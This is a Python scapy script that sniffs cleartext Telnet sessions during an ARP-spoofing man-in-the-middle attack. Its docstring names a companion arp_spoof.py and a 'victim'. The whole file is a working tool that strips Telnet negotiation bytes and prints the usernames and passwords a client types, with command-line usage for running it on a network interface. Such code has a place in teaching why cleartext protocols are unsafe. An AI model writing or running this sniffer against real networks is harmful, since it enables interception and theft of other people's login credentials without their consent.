#!/usr/bin/env python3
"""
telnet_sniff.py -- watch a cleartext Telnet session and print what the client
types (username + password) while we are man-in-the-middle for it.

Prereqs:
  * MITM is up:  sudo python3 arp_spoof.py <client> <server>
  * The victim opens `telnet <server>` and logs in.

How it works:
  Telnet is unencrypted and sends the client's keystrokes to the server on
  TCP port 23. We sniff only the client -> server direction (dport 23), strip
  the Telnet IAC option-negotiation bytes, and print the remaining printable
  characters. The server does NOT echo the password, but the CLIENT still
  transmits it in the clear -- so watching client -> server reveals it anyway.

Usage:
  sudo python3 telnet_sniff.py -i eth0            # sniff all telnet clients
  sudo python3 telnet_sniff.py -i eth0 --server 10.0.0.5   # one server only
"""
from scapy.all import IP, TCP, Raw, sniff
import argparse

IAC = 0xFF   # Telnet "Interpret As Command" escape byte


def build_args():
    p = argparse.ArgumentParser(description="Cleartext Telnet keystroke sniffer")
    p.add_argument("-i", "--iface", required=True, help="Interface to sniff on")
    p.add_argument("--server", default=None,
                   help="Only show sessions to this server IP (optional)")
    return p.parse_args()


def strip_telnet(data):
    """Remove Telnet IAC negotiation sequences, keep the human-typed bytes."""
    out = bytearray()
    i = 0
    while i < len(data):
        b = data[i]
        if b == IAC:
            # IAC SB ... IAC SE  (variable-length sub-negotiation)
            if i + 1 < len(data) and data[i + 1] == 0xFA:
                i += 2
                while i < len(data) and data[i] != 0xF0:  # 0xF0 == SE
                    i += 1
                i += 1
                continue
            # IAC <command> <option>  (3-byte WILL/WONT/DO/DONT etc.)
            i += 3
            continue
        out.append(b)
        i += 1
    return bytes(out)


def make_handler(server):
    def process(pkt):
        # client -> server keystrokes only
        if not (pkt.haslayer(TCP) and pkt[TCP].dport == 23 and pkt.haslayer(Raw)):
            return
        if server and pkt[IP].dst != server:
            return
        typed = strip_telnet(bytes(pkt[Raw].load))
        # keep printable ASCII plus newline/carriage-return
        text = "".join(chr(c) if 32 <= c < 127 else
                       ("\n" if c in (10, 13) else "") for c in typed)
        if text:
            src = pkt[IP].src
            print("[{} -> :23] {}".format(src, text), end="", flush=True)
    return process


def main():
    a = build_args()
    print("[*] Sniffing Telnet keystrokes on {} (Ctrl+C to stop)".format(a.iface))
    sniff(iface=a.iface, store=False, prn=make_handler(a.server),
          filter="tcp port 23")


if __name__ == "__main__":
    main()
